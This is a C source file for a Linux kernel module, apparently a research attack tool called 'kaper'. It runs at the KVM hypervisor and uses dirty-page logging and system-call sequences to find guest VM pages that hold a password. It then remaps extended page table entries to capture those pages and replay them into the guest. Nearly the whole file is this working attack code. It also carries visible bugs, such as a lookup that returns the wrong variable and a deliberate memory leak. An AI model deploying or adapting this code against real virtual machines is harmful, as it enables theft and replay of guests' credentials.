#define pr_fmt(fmt) "XX mem_tracer: " fmt

#include "mem_tracer.h"
#include <linux/device.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/io.h>
#include <linux/mm.h>
#include <asm/pgtable.h>
#include <asm/io.h>
#include <asm/tlbflush.h>
#include <asm/irqflags.h>
#include <linux/slab.h>
#include <linux/hugetlb.h>
#include <linux/fdtable.h>
#include <linux/kvm_host.h>
#include <linux/debugfs.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <asm/virtext.h>
#include <linux/fs.h>
#include "kaper_handlers.h"
#include "kaper.h"
#include "mem_debugfs.h"
#include "cr3_to_mem_debugfs.h"
#include "slot_to_syscall_debugfs.h"
#include "syscall_tracer.h"
#include "baseline_tracer.h"
#include "pt_mod.h"
#include "decrypt_hlt.h"
#include "ept_handler.h"
#include "kaper_stage_trace.h"
#include "kaper_stage_capture.h"

static int save_ept(u64 gfn, u64 *found_hpa, struct kvm_vcpu* vcpu);
static int restore_ept(u64 gfn, u64 found_hpa, struct kvm_vcpu* vcpu);

// clear gfn 2 sc hashtable along with system call lists
static void clear_gfn2sc(void);
// create new hashtable entry for gfn to syscall list hashtable
// must hold gfn2sc_lock
static struct gfn_to_syscall_ht* new_gfn2sc(gfn_t gfn);
// try to add sc to existing list for gfn
// if no list exists yet create a new one and add it there
// must hold gfn2sc_lock
static int add_sc2gfn(int sc_id, gfn_t gfn, bool match);
// find hashtable entry for gfn to syscall list hashtable
// must hold gfn2sc_lock
static struct gfn_to_syscall_ht* find_gfn2sc(gfn_t gfn);

static atomic_t is_init; // protected by memtrace_lock

// hashtable guest frame number TO
// list of syscalls preceeding a write to that page
DEFINE_HASHTABLE(gfn2sc, 8);
// protects gfn2sc
DEFINE_SPINLOCK(gfn2sc_lock);

// stores captured pages hopefully containing the password
// is also protected by gfn2sc_lock
static char cap_pw_page[PAGE_SIZE];
static gfn_t cap_pw_page_gfn;
static int cap_pw_matched_offset;
static atomic_t pw_page_captured;
static atomic_t pw_page_replayed;

// XXX TODO: use some heuristic like size
#define RAM_MEMSLOT_ID 5
#define RAM_MEMSLOT_AS_ID 0

// to store the captured pages data
static char page_bkp[PAGE_SIZE];
// the guest frame number of the captured page
static char gfn_bkp;
// host physical address of captured page
static u64 caphpa;
// have we replayed a page already?
static bool replayed;

// print information about a guest memory slot
static void print_memslot_info(struct kvm_vcpu *vcpu)
{
   unsigned int i;
   struct kvm_memory_slot *memslot = NULL;

   for (i=0; i < KVM_ADDRESS_SPACE_NUM; i++) {
      pr_info("AS[%d]\n", i);
      kvm_for_each_memslot(memslot, vcpu->kvm->memslots[i]) {
         pr_info("Memslot[%d] %lx %llx %lx %p\n",
               memslot->id, memslot->npages, memslot->base_gfn, memslot->userspace_addr, memslot->dirty_bitmap);
      }
   }

}

static DEFINE_SPINLOCK(init_lock);
static bool is_init_and_set(void) {
   bool ret;
   spin_lock(&init_lock);
   if(!atomic_read(&is_init)) {
      atomic_inc(&is_init);
      ret = false;
   } else {
      ret = true;
   }
   spin_unlock(&init_lock);
   return ret;
}

/*
 * Initialize Memroy Tracing
 *    - Enable Dirty Bitmap Tracking for Guest RAM
 *      Currently the guest RAM memslot is detected by it's size
 */
int init_mem_trace(struct kvm_vcpu *vcpu) {
   int ret;
   struct kvm_memory_slot *memslot;

   if(is_init_and_set()) {
      pr_warn("Already initialized\n");
      return -EFAULT;
   }
   if(!vcpu) {
      pr_err("vcpu invalid\n");
      return -EFAULT;
   }

   ret = 0;

   // check dirty mem logging
   memslot = id_to_memslot(kvm_memslots(vcpu->kvm), RAM_MEMSLOT_ID);
   if(!memslot) {
      pr_err("Could not get guest memslot %d\n", RAM_MEMSLOT_ID);
      print_memslot_info(vcpu);
      ret = EFAULT;
      goto fail;
   }

   if(!memslot->dirty_bitmap) {
      pr_info("No dirty bitmap for %d\n", RAM_MEMSLOT_ID);
      ret = EFAULT;
      goto fail;
   }

   atomic_set(&pw_page_captured, 0);
   atomic_set(&pw_page_replayed, 0);

   pr_info("Memory Trace initialized\n");
   goto out;

fail:
   atomic_dec(&is_init);
out:
   return ret;
}

int reset_mem_trace(struct kvm_vcpu* vcpu) {
   if(!atomic_dec_and_test(&is_init)) {
      pr_warn("can not reset because mem tracer not initialized\n");
      return -EFAULT;
   }

   pr_info("reset_mem_trace\n");

   clear_gfn2sc();
   atomic_set(&pw_page_captured, 0);
   atomic_set(&pw_page_replayed, 0);

   pr_info("reset_mem_trace done\n");

   return 0;
}

bool get_capture_status(void)
{
   return atomic_read(&pw_page_captured);
}

bool get_replay_status(void)
{
   return atomic_read(&pw_page_replayed);
}

// overwrite page table entry for gfn with captured page
static int restore_ept(u64 gfn, u64 found_hpa, struct kvm_vcpu* vcpu) {
   u64 gpa = gfn << PAGE_SHIFT;
   // must hold mmu lock
   u64* newsptep = get_ptptr_nolock(gpa, vcpu);

   pr_info("Restoring SPTE\n");
   if(newsptep == NULL) {
      pr_err("Error getting spte for gpa %llx\n", (unsigned long long)gpa);
      return -EFAULT;
   }

   kvm_write_guest_page(vcpu->kvm, gfn_bkp, page_bkp, 0, PAGE_SIZE);
   pr_info("target SPTE: %llx\n", *newsptep);

	kvm_flush_remote_tlbs(vcpu->kvm);
   __flush_tlb_all();
   *newsptep = (*newsptep & 0xfff) | caphpa;
   __flush_tlb_all();
	kvm_flush_remote_tlbs(vcpu->kvm);

   printk("replayed SPTE: %llx\n", *newsptep);
   replayed = true;
   return 0;
}


// remove page table entry for gfn, to capture data for later replay
static int save_ept(u64 gfn, u64 *out_hpa, struct kvm_vcpu* vcpu) {
   // this is a severe memory leak,
   // but if i free this memory, we might crash the guest
   char* tmpva = kmalloc(PAGE_SIZE, GFP_KERNEL);
   u64 tmphpa = virt_to_phys(tmpva);
   u64 gpa = gfn << PAGE_SHIFT;

   // must hold mmu lock
   u64* capsptep = get_ptptr_nolock(gpa, vcpu);

   if(capsptep == NULL) {
      pr_err("Error getting spte for gpa %llx\n", (unsigned long long)gpa);
      return -EFAULT;
   }

   kvm_read_guest_page(vcpu->kvm, gfn, page_bkp, 0, PAGE_SIZE);
   gfn_bkp = gfn;

   pr_info("GPA: %llx, SPTE: %llx, found hpa: %llx\n",
         gpa, *capsptep, *out_hpa);

	kvm_flush_remote_tlbs(vcpu->kvm);
   __flush_tlb_all();
   *out_hpa = *capsptep & 0xffffffffffff000;
   *capsptep = (*capsptep & 0xfff) | tmphpa;
   __flush_tlb_all();
	kvm_flush_remote_tlbs(vcpu->kvm);

   pr_info("new SPTE: %llx\n", *capsptep);
   return 0;
}

struct gfn_to_syscall_ht* get_gfn2sc(gfn_t gfn, unsigned long* flags)
{
   spin_lock_irqsave(&gfn2sc_lock, *flags);
   return find_gfn2sc(gfn);
}


void put_gfn2sc(unsigned long* flags)
{
   spin_unlock_irqrestore(&gfn2sc_lock, *flags);
}

// clear gfn 2 sc hashtable along with system call lists
static void clear_gfn2sc(void)
{
   struct gfn_to_syscall_ht *g2s;
   struct hlist_node *h_tmp;
   struct sc_list *sc, *sc_tmp;
   int bkt;
   unsigned long flags;

   spin_lock_irqsave(&gfn2sc_lock, flags);

   pr_info("Clearing gfn2sc\n");
   // FIXME ?

   hash_for_each_safe(gfn2sc, bkt, h_tmp, g2s, hlist) {
      // delete syscall list
      list_for_each_entry_safe(sc, sc_tmp, &g2s->sc_list, list) {
         list_del(&sc->list);
         kfree(sc);
      }
      hash_del(&g2s->hlist);
      kfree(g2s);
   }
   pr_info("Clearing gfn2sc done\n");
   spin_unlock_irqrestore(&gfn2sc_lock, flags);
}

// create new hashtable entry for gfn to syscall list hashtable
static struct gfn_to_syscall_ht* new_gfn2sc(gfn_t gfn)
{
   struct gfn_to_syscall_ht* g2s =
      (struct gfn_to_syscall_ht*)kmalloc(
            sizeof(struct gfn_to_syscall_ht),
            GFP_ATOMIC // use atomic here just in case we get called in an int context
            );
   if(!g2s) {
      pr_err("Error allocating gfn_to_syscall_ht entry\n");
      return NULL;
   }

   // init syscall list
   INIT_LIST_HEAD(&g2s->sc_list);
   g2s->sc_len = 0;
   g2s->gfn = gfn;
   hash_add(gfn2sc, &(g2s->hlist), gfn);

   return g2s;
}

// find hashtable entry for gfn to syscall list hashtable
// must hold gfn2sc_lock
static struct gfn_to_syscall_ht* find_gfn2sc(gfn_t gfn)
{
   struct gfn_to_syscall_ht* g2s;
   struct gfn_to_syscall_ht* g2s_ret = NULL;

   hash_for_each_possible(gfn2sc, g2s, hlist, gfn)
   {
      if(g2s->gfn == gfn) {
         g2s_ret = g2s;
         break;
      }
   }
   return g2s;
}

// try to add sc to existing list for gfn
// if no list exists yet create a new one and add it there
// must hold gfn2sc_lock
static int add_sc2gfn(int sc_id, gfn_t gfn, bool match)
{
   struct gfn_to_syscall_ht *g2s;
   struct sc_list *sc;
   int ret;

   ret = 0;

   //spin_lock(&gfn2sc_lock);

   g2s = find_gfn2sc(gfn);
   if(g2s == NULL) {
      g2s = new_gfn2sc(gfn);
      if(g2s == NULL) {
         ret = -EFAULT;
         goto out;
      }
   }

   // create entry for syscall list for this guest page
   sc = kmalloc(sizeof(struct sc_list), GFP_ATOMIC);
   if(sc == NULL) {
      pr_err("Error allocating syscall_list\n");
      ret = -EFAULT;
      goto out;
   }
   // set system call number
   sc->id = sc_id;
   sc->match = match;
   // add syscall entry to guest page list
   list_add_tail(&sc->list, &g2s->sc_list);

   // increase length of system call ist
   g2s->sc_len++;

out:
   //spin_unlock(&gfn2sc_lock);
   return ret;
}

#define SIMIL_THRESH 10
// TODO check if this can be executed concurrently
// should we lock? <- WHY?
// DEBUG
static char guest_data[PAGE_SIZE];
static void stage_trace_analyse_dirty_guest_frames(
      struct kvm_vcpu *vcpu,
      int sc_id,
      struct kvm_memory_slot *memslot,
      unsigned long bitmap,
      gfn_t gfn_offset)
{
   unsigned long slx;
   // trace
   int target_data_offset;
   bool match;
   // capture
   int simil_score;
   int matched_offset;
   struct gfn_to_syscall_ht *g2s;
   struct kvm* kvm;

   kvm = vcpu->kvm;

   gfn_offset += memslot->base_gfn;
   for(slx = bitmap; slx!=0; slx=slx>>1, gfn_offset++) {
      if(!(slx & 0x1)) {
         continue;
      }
      // add syscall which preceeded write to this guest page
      if(kaper_stage == KAPER_TRACE) {
         match = false;
         kvm_read_guest_page(kvm, gfn_offset, guest_data, 0, PAGE_SIZE);
         target_data_offset = contains_target_data(0, guest_data, PAGE_SIZE);
         if(target_data_offset >= 0) {
            pr_info("Found search string @ %llx:+%x\n",
                  (unsigned long long)gfn_offset, target_data_offset);
            // only add an entry to the debugfs if we found the target data on that page
            slot_to_syscall_debugfs_add_file(gfn_offset, 12345, target_data_offset);
            match = true;
         }

         add_sc2gfn(sc_id, gfn_offset, match);

      } else if(kaper_stage == KAPER_CAPTURE && !get_capture_status()) {
         // DEBUG
         match = false;
         // \DEBUG
         g2s = find_gfn2sc(gfn_offset);
         if(g2s) {

            simil_score = match_target_sequence(&g2s->sc_list, g2s->sc_len, &matched_offset);
            if(simil_score < SIMIL_THRESH) {
               pr_info("COST : %d @ %llx\n", simil_score, (unsigned long long)gfn_offset);
               save_ept(gfn_offset, &caphpa, vcpu);
               cap_pw_page_gfn = gfn_offset;
               cap_pw_matched_offset = matched_offset & 0xfff;
               atomic_inc(&pw_page_captured);
               pr_info("---> matched offset %x\n", cap_pw_matched_offset);
            }

            // DEBUG
            target_data_offset = contains_target_data(0, guest_data, PAGE_SIZE);
            add_sc2gfn(sc_id, gfn_offset, match);
         }
      } else if(kaper_stage == KAPER_REPLAY && get_capture_status()) {
         // DEBUG
         match = false;
         // \DEBUG

         // TODO: ??
         if(gfn_offset == cap_pw_page_gfn) // otherwise we might hit the same captured page
            continue;

         g2s = find_gfn2sc(gfn_offset);
         if(g2s) {

            simil_score = match_target_sequence(&g2s->sc_list, g2s->sc_len, &matched_offset);
            if(simil_score < SIMIL_THRESH) {
               pr_info("R COST : %d @ %llx\n", simil_score, (unsigned long long)gfn_offset);
               restore_ept(gfn_offset, caphpa, vcpu);
            }

            // TODO: only replay once ?
            //atomic_set(&pw_page_captured, 0);
            //atomic_inc(&pw_page_replayed);

            // DEBUG
            target_data_offset = contains_target_data_dbg(0, guest_data, PAGE_SIZE);
            add_sc2gfn(sc_id, gfn_offset, match);
            // \DEBUG
         }
      }
   }
}

/**
 * XXX see virt/kvm/kvm_main.c
 *
 * kvm_get_dirty_log_protect - get a snapshot of dirty pages, and if any pages
 *	are dirty write protect them for next write.
 * @kvm:	pointer to kvm instance
 * @log:	slot id and address to which we copy the log
 * @is_dirty:	flag set if any page is dirty
 *
 * We need to keep it in mind that VCPU threads can write to the bitmap
 * concurrently. So, to avoid losing track of dirty pages we keep the
 * following order:
 *
 *    1. Take a snapshot of the bit and clear it if needed.
 *    2. Write protect the corresponding page.
 *    3. Copy the snapshot to the userspace.
 *    4. Upon return caller flushes TLB's if needed.
 *
 * Between 2 and 4, the guest may write to the page using the remaining TLB
 * entry.  This is not a problem because the page is reported dirty using
 * the snapshot taken before and step 4 ensures that writes done after
 * exiting to userspace will be logged for the next call.
 *
 */
int kvm_get_dirty_log_protect_2(
      //struct kvm *kvm,
      struct kvm_vcpu* vcpu,
      int sc_id,
      int as_id,
      int ms_id,
      bool *is_dirty)
{
	int i;
	unsigned long n;
	unsigned long *dirty_bitmap;
	unsigned long *dirty_bitmap_buffer;
	struct kvm_memslots *slots;
	struct kvm_memory_slot *memslot;
   struct kvm* kvm;

   kvm = vcpu->kvm;
	if (as_id >= KVM_ADDRESS_SPACE_NUM || ms_id >= KVM_USER_MEM_SLOTS)
		return -EINVAL;

	slots = __kvm_memslots(kvm, as_id);
	memslot = id_to_memslot(slots, ms_id);

	dirty_bitmap = memslot->dirty_bitmap;
	if (!dirty_bitmap)
		return -ENOENT;

	n = kvm_dirty_bitmap_bytes(memslot);

	dirty_bitmap_buffer = dirty_bitmap + n / sizeof(long);
	memset(dirty_bitmap_buffer, 0, n);

	spin_lock(&kvm->mmu_lock);
	*is_dirty = false;
	for (i = 0; i < n / sizeof(long); i++) {
		unsigned long mask;
		gfn_t offset;

		if (!dirty_bitmap[i])
			continue;

		*is_dirty = true;

		mask = xchg(&dirty_bitmap[i], 0);
		dirty_bitmap_buffer[i] = mask;

		if (mask) {
			offset = i * BITS_PER_LONG;
         stage_trace_analyse_dirty_guest_frames(vcpu, sc_id, memslot, mask, offset);
			kvm_arch_mmu_enable_log_dirty_pt_masked(kvm, memslot,
								offset, mask);
		}
	}

	spin_unlock(&kvm->mmu_lock);
	return 0;
}

/**
 * XXX see arch/x86/kvm/x86.c
 *
 * kvm_vm_ioctl_get_dirty_log - get and clear the log of dirty pages in a slot
 * @kvm: kvm instance
 * @log: slot id and address to which we copy the log
 *
 * Steps 1-4 below provide general overview of dirty page logging. See
 * kvm_get_dirty_log_protect() function description for additional details.
 *
 * We call kvm_get_dirty_log_protect() to handle steps 1-3, upon return we
 * always flush the TLB (step 4) even if previous step failed  and the dirty
 * bitmap may be corrupt. Regardless of previous outcome the KVM logging API
 * does not preclude user space subsequent dirty log read. Flushing TLB ensures
 * writes will be marked dirty for next log read.
 *
 *   1. Take a snapshot of the bit and clear it if needed.
 *   2. Write protect the corresponding page.
 *   3. Copy the snapshot to the userspace.
 *   4. Flush TLB's if needed.
 */
// must hold gfn2sc_lock
int kvm_vm_ioctl_get_dirty_log_2(
      //struct kvm *kvm,
      struct kvm_vcpu *vcpu,
      int sc_id,
      int as_id,
      int ms_id)
{
	bool is_dirty = false;
   struct kvm* kvm;
	int r;

   kvm = vcpu->kvm;
	mutex_lock(&kvm->slots_lock);

	/*
	 * Flush potentially hardware-cached dirty pages to dirty_bitmap.
	 */
	if (kvm_x86_ops->flush_log_dirty)
		kvm_x86_ops->flush_log_dirty(kvm);

	r = kvm_get_dirty_log_protect_2(vcpu, sc_id, as_id, ms_id, &is_dirty);

	/*
	 * All the TLBs can be flushed out of mmu lock, see the comments in
	 * kvm_mmu_slot_remove_write_access().
	 */
	lockdep_assert_held(&kvm->slots_lock);
	if (is_dirty)
		kvm_flush_remote_tlbs(kvm);

	mutex_unlock(&kvm->slots_lock);
	return r;
}

size_t mem_checkpoint(struct kvm_vcpu* vcpu, int sc_id)
{
   unsigned long flags;
   if(!atomic_read(&is_init)) {
      //pr_err("Memory Trace not initialized\n");
      return 0;
   }

   spin_lock_irqsave(&gfn2sc_lock, flags);
   kvm_vm_ioctl_get_dirty_log_2(vcpu, sc_id, RAM_MEMSLOT_AS_ID, RAM_MEMSLOT_ID);
   spin_unlock_irqrestore(&gfn2sc_lock, flags);
   return 0;
}

